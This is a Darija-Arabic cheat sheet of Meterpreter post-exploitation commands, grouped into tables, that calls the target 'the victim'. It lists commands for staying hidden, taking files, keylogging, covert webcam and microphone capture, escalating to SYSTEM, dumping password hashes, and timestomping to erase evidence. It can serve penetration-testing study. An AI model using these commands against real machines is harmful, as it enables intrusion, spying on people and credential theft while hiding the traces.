 Core Commands
| الأمر                |                                    الوظيفة           	                                                            		|
| --------------------   | ---------------------------------------------------------|
| `help` أو `?`           |    Show list of commands                                                                   |
| `background` أو `bg`    | ترجّع الجلسة (session) للخلف باش تبقى خدام فـ Metasploit        |
| `exit` أو `quit`        | تسد الجلسة مع الضحية                                                                  |
| `migrate`              | تنقل Meterpreter لعملية (process) أخرى باش تبقى مخفي               |
| `sessions`             | تعرض جميع الجلسات النشيطة                                                         |
| `sessions -i           | تدخل لجلسة معينة                                                                       |

. File System Commands
| الأمر             |                          الوظيفة                           |
| ----------------- | ------------------------- |
| `ls` أو `dir`      | تعرض الملفات فـ مجلد معين         |
| `cd`              | تغيّر المجلد الحالي                     |
| `pwd`             | يبين المسار الحالي                    |
| `download <file>` | تحميل ملف من جهاز الضحية         |
| `upload <file>`   | رفع ملف إلى جهاز الضحية            |
| `rm <file>`       | حذف ملف                               |
| `mkdir <name>`    | إنشاء مجلد                              |

. Networking Commands
| الأمر                    |                                        الوظيفة                                   |
| ------------------------ | -----------------------------------|
| `ipconfig` أو `ifconfig`  | عرض معلومات الشبكة ديال الضحية                |
| `netstat`                | عرض الاتصالات النشيطة (المنافذ المفتوحة)      |
| `arp`                    | عرض ARP cache                      |
| `route`                  | عرض أو تعديل جدول التوجيه (routing)     |

. System Commands

| الأمر                  |                                    الوظيفة                                                      |
| ---------------------- | -------------------------------------------  |
| `sysinfo`              | عرض معلومات عن النظام (نسخة Windows، اسم الجهاز...)   |
| `ps`                   | عرض جميع العمليات الجارية                                         |
| `kill <pid>`           | قتل عملية معينة                                   		      |
| `shell`                | تفتح CMD مباشرة (سطر أوامر ويندوز)    		                |
| `reboot`               | إعادة تشغيل جهاز الضحية                    		             |
| `shutdown`             | إغلاق الجهاز                                   			       |
| `getuid`               | يعرض المستخدم الحالي                       			         |
| `getpid`               | يعرض رقم العملية ديال Meterpreter                 |
| `execute -f <command>` | تشغيل أمر معين فالنظام                           		      |

. User Interface Commands

| الأمر           |                      الوظيفة                                        |
| --------------- | -------------------------------- |
| `screenshot`    | أخذ لقطة شاشة لجهاز الضحية                 |
| `screenshare`   | مشاهدة سطح المكتب في الوقت الحقيقي  |
| `keyscan_start` | بدء تسجيل الضغطات على لوحة المفاتيح     |
| `keyscan_dump`  | عرض الضغطات التي تم تسجيلها               |
| `keyscan_stop`  | إيقاف تسجيل الضغطات                           |

. Webcam Commands

| الأمر           |                      الوظيفة                        |
| --------------- | ---------------------- |
| `webcam_list`   | يعرض الكاميرات المتوفرة         |
| `webcam_snap`   | يأخذ صورة بالكاميرا                |
| `webcam_stream` | يشاهد بث مباشر من الكاميرا  |
| `record_mic`    | يسجل الصوت من الميكروفون   |

. Privilege & Password Commands

| الأمر       |              الوظيفة                                                                                               |
| ----------- | -------------------------------------------------------------- |
| `getsystem` | تحاول تاخذ صلاحيات "SYSTEM"                                        |
| `hashdump`  | استخراج كلمات السر (هاشات) من SAM database (بحال ملفات الوندوز ديال اليوزر) |

. Timestomp
| الأمر              |                            الوظيفة                                                 |
| ------------------ | --------------------------------------- |
| `timestomp <file>` | تغيّر تاريخ الإنشاء أو التعديل لملف (باش تمحي الأدلة) |
